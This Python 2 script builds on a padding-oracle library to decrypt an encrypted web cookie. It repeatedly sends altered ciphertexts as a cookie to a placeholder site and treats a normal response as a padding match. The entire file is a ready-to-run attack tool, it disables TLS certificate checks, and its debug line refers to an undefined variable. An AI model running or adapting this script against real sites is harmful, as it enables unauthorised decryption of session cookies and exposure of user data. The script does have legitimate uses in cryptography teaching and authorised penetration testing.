# -*- coding: utf-8 -*-
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time


class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.session(prefetch=True, timeout=5, verify=False)

    def oracle(self, data):
        somecookie = quote(b64encode(data))
        self.session.cookies['somecookie'] = somecookie

        while 1:
            try:
                response = self.session.get('http://www.example.com/')
                break
            except (socket.error, requests.exceptions.SSLError):
                time.sleep(2)
                continue

        self.history.append(response)

        if response.ok:
            logging.debug('No padding exception raised on %r', cookie)
            return

        raise BadPaddingException


if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[1:]:
        print 'Usage: %s <somecookie value>' % (sys.argv[0], )
        sys.exit(1)

    logging.basicConfig(level=logging.DEBUG)

    encrypted_cookie = b64decode(unquote(sys.argv[1]))

    padbuster = PadBuster()

    cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))

    print('Decrypted somecookie: %s => %r' % (sys.argv[1], cookie))
